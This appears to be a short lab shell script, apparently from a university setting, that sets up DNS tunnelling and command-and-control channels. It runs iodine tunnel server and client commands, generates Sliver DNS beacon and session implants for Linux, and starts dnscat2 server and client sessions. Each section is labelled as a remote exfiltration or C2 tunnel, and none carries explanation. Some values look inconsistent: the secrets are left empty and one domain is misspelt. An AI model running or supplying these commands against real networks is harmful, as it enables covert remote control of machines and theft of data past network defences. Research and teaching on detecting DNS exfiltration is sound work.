
set -e 
pass=$1 

# ################# Iodine DNS Tunnel Remote Exfil tunnel ##########################
# iodine tunnel server 
sudo iodined -f -c -P bleed 192.120.0.0 t.bleed.io 

# iodine tunnel client 
sudo iodine -P bleed  -f -r 10.158.82.53 t.bleed.io 
 

# ################# Sliver DNS Remote C2 and Tunnel Remote Exfil tunnel ##########################
dns -d  sliver.pole.io.
# beacon exfil in kernel
generate --dns sliver.pole.io. beacon --seconds 6 --jitter 1  --debug --os linux  --save /tmp/bleed
# session exfil in kernel
generate --dns sliver.pole.io.  --debug --os linux  --save /tmp/bleed


# ################# dnscat2 DNS Remote C2 and Tunnel Remote Exfil tunnel ##########################
sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,domain=dnscat.strive.io'
./dnscat --secret= dnscat.strives.io

sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,port=143,domain=dnscat.strive.io'
./dnscat --dns server=cssvlab06.uwb.edu,port=143,domain=dnscat.strive.io --secret=



